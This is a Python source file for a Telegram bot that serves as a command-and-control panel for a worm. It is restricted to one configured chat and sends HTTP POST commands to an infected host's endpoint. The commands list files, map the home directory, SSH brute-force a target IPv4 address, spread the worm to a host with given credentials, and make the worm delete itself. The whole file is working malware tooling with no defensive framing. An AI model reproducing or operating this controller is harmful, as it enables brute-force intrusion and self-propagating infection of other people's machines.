import json
import requests
import validators
from telegram import *
from telegram.ext import *

def authorized(chat_id):
	if chat_id != int(config["chat_id"]):
		return False
	else:
		return True
		
def start(update,context):
	if not authorized(update.message.chat_id):
		update.message.reply_text("user not authorized!")
		return
	else:
		update.message.reply_text("Welcome!")

def hello(update,context):
	if not authorized(update.message.chat_id):return
	update.message.reply_text("hi! I'm the bot!")	
		
def ls(update,context):
	if update.message is None: return 

	if not authorized(update.message.chat_id):return

	if len(context.args) != 2:
		update.message.reply_text("Usage: /ls <URL> <PATH>,only two arguments are required")
		return
		
	if not validators.url(context.args[0]):
		update.message.reply_text("First argument is not an URL")
		return
	
	request = requests.post(context.args[0],data="ls&"+context.args[1])
	if request.status_code == 200:
		update.message.reply_text(request.text)
	else:
		update.message.reply_text("error message: "+ request.text + "\ncould not execute command, make sure to enter the correct URL")
		
def ssh_brute_force(update,context):
	if update.message is None: return 

	if not authorized(update.message.chat_id):return

	if len(context.args) != 2:
		update.message.reply_text("Usage: /ssh_brute_force <URL> <IPv4>, only two arguments are required")
		return
		
	if not validators.url(context.args[0]):
		update.message.reply_text("First argument is not an URL")
		return
	
	if not validators.ip_address.ipv4(context.args[1]):
		update.message.reply_text("Given ipv4 is not valid")
		return
	
	request = requests.post(context.args[0],data="ssh_brute_force&"+context.args[1])
	if request.status_code == 200:
		update.message.reply_text(request.text)
	else:
		update.message.reply_text("error message: "+ request.text + "\ncould not execute command, make sure to enter the correct URL")
		
def spread(update,context):
	if update.message is None: return 

	if not authorized(update.message.chat_id):return

	if len(context.args) != 4:
		update.message.reply_text("Usage: /spread <URL> <HOST> <USERNAME> <PASSWORD>, four arguments are required")
		return
		
	if not validators.url(context.args[0]):
		update.message.reply_text("Given argument is not an URL")
		return
	if not validators.ip_address.ipv4(context.args[1]):
		update.message.reply_text("Given ipv4 is not valid")
		return
	
	request = requests.post(context.args[0],data="spread&"+context.args[1]+"&"+context.args[2]+"&"+context.args[3])
	if request.status_code == 200:
		update.message.reply_text(request.text)
	else:
		update.message.reply_text("error message: "+ request.text + "\ncould not execute command, make sure to enter the correct URL")

def delete(update,context):
	if update.message is None: return
	
	if not authorized(update.message.chat_id):return
	
	if len(context.args) != 1:
		update.message.reply_text("Usage: /delete <URL> , one and only one argument is required")
		return
	
	if not validators.url(context.args[0]):
		update.message.reply_text("Given argument is not an URL")
		return
	
	request = requests.post(context.args[0],data="delete")
	if request.status_code == 503:
		update.message.reply_text("worm deleted itself and exited")
	else:
		update.message.reply_text("Something went wrong")
		
def tree_home(update,context):
	if update.message is None: return
	
	if not authorized(update.message.chat_id):return
	
	if len(context.args) != 1:
		update.message.reply_text("Usage: /tree_home <URL> , one and only one argument is required")
		return
	
	if not validators.url(context.args[0]):
		update.message.reply_text("Given argument is not an URL")
		return
	
	request = requests.post(context.args[0],data="tree_home")
	if request.status_code == 200:
		update.message.reply_text(request.text)
	else:
		update.message.reply_text("error message: "+ request.text + "\ncould not execute command, make sure to enter the correct URL")

if __name__ == "__main__":
	con_file = open("config.json","r")
	config = json.load(con_file)
	con_file.close()

	updater = Updater(config["http_token"])
	dispatcher = updater.dispatcher

	dispatcher.add_handler(CommandHandler("start",start))
	dispatcher.add_handler(CommandHandler("hello",hello))
	dispatcher.add_handler(CommandHandler("ls",ls))
	dispatcher.add_handler(CommandHandler("tree_home",tree_home))
	dispatcher.add_handler(CommandHandler("delete",delete))
	dispatcher.add_handler(CommandHandler("ssh_brute_force",ssh_brute_force))
	dispatcher.add_handler(CommandHandler("spread",spread))
	
	updater.start_polling()
	updater.idle()
